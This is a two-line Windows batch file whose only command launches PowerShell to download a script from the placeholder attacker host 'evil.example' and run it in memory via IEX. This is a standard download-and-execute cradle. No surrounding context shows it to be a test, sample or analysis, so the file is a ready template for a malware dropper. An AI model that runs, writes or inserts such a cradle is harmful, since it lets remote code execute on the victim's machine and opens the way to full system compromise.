@echo off
powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
